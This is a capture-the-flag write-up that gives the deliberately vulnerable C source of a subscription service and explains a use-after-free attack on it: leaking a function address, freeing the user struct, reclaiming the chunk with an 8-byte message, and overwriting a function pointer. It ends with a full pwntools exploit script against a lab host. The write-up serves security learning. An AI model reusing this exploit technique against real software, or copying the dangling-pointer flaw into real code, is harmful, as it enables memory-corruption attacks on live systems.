## Challenge Name: unsubscription are free

Challenge Description: 

You are given the source code of the C backend to handle user subscriptions, premium memberships, and account management of a streamer, but the actual service is running remotely. Your task is to analyze the code, discover a vulnerability, and exploit it by interacting with the remote service to find the flag.

**TL;DR:**
This challenge abuses a Use-After-Free (UAF) vulnerability in a C program managing user subscriptions. By:

1. Subscribing, you get a leak of the `hahaexploitgobrrr()` address (which prints the flag).
2. Inquiring about account deletion, you trigger a `free(user)` — creating a dangling pointer.
3. Using `leaveMessage()`, you call `malloc(8)` and overwrite the freed memory (specifically the function pointer in the user struct).
4. Overwriting the `whatToDo` function pointer with the leaked address and triggering `doProcess()` calls the flag function.
5. Exploitation was done via Python using pwntools with `p64()` to write the address in the correct format.

**vuln.c**
```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
```

### Approach

**1. Trying Out The Program**

When you connect to the remote server, you are greeted with different options to interact with your subscription to the stream. When I tried to input 'S' to subscribe to the channel, I was given a memory address that was leaked in the program.

```console
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
S
OOP! Memory leak...0x401965
Thanks for subsribing! I really recommend becoming a premium member!
```

After checking the source code, this address points to a function called `hahaexploitgobrrr()` that contains the key to retrieve the flag. The only problem is how to exploit this address to achieve that.

**2. I Wonder How To Use This Address?**

While finding answers through the source code, I found that in order for the user inputs to run, it needed to pass a function address to a function pointer called `(*whattodo)()` in the `cmd *user` struct. I have the address of the `hahaexploitgobrrr()` so I can exploit and use this function to run it, the question is how.

**3. Finding A Way To Pass The Address To The Function Pointer?**

I was able to ask AI for assistance, and it responded with something about UAF (Use-After-Free) vulnerability, which has something to do with dangling pointers. A dangling pointer happens when you free a memory, but the pointer is still pointing to it if you do not set it to `NULL`.

In the source code, when it allocates the user pointer using `⁣user = (cmd *)malloc(sizeof(user));`, it reserves a small chunk of memory on the heap. Now I can overwrite the memory space by freeing the user, leaving a dangling pointer. To free the user, I can input 'I' in the program to inquire about account deletion.

```console
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
I
You're leaving already(Y/N)?
Y
Bye!
```

All I need is to occupy the dangling `cmd *user` pointer with the address of the `hahaexploitgobrrr()` to run the `uintptr_t (*whatToDo)();` function pointer. But how?

**4. Occupying The Memory Space**

Now the problem is how to occupy the memory space. The solution for this lies in the `leaveMessage()` function; it does:

```c
char* msg = (char*)malloc(8);      // Allocates 8 bytes
read(0, msg, 8);                   // Lets you write 8 bytes into it
```

Since user object was just freed, `malloc(8)` reuses the same memory that user object previously occupied (due to heap allocation optimizations). This means your input overwrites the old user struct. The user object is a struct defined as:

```c
typedef struct {
    uintptr_t (*whatToDo)();       // Function pointer (4 or 8 bytes)
    char *username;                // String pointer (4 or 8 bytes)
} cmd;
```

Meaning I can just send in the first 8 bytes, the leaked address of the  `hahaexploitgobrrr()` to overwrite the `(*whatToDo)()` pointer function using `read(0, msg, 8)`. Another question is how. Well, with the help of AI, all I need to do is use `pwntools` in Python and use the `p64(value)` helper function, which is often used in binary exploitation and CTF challenges when crafting payloads that overwrite memory.

**5. Time To Get That Flag🚩**

Now we just need to create our solver program to get that flag. This is also the **full source code** of the solution.

```python
from pwn import *

p = remote('192.168.8.136', 10013)

# Step 1: Get the leaked address
p.sendlineafter('(e)xit\n', 'S')
leak_line = p.recvline()
leak_addr = int(leak_line.split(b'...')[1].strip(), 16)

# Step 2: Free the user object
p.sendlineafter('(e)xit\n', 'I')
p.sendlineafter('You\'re leaving already(Y/N)?\n', 'Y')

# Step 3: Overwrite the function pointer
p.sendlineafter('(e)xit\n', 'L')
p.send(p64(leak_addr))

# The program will now call doProcess() with our overwritten pointer
# and execute hahaexploitgobrrr()
p.interactive()
```
The flag is:
> CITU{CWE_416_USE_AFTER_FREE}

### Reflections
PLEASE set pointers to null after freeing it. This makes me appreciate segmentation faults more than having vulnerable programs 😭.

This also made me realize that I still do not know C that much and why developers are very strict about memory leaks—that most modern programming languages today have garbage collectors or automatic memory management.

Also, most of the logic to find the answer of this CTF is through **AI**.

---
[**Back to Home**](/)
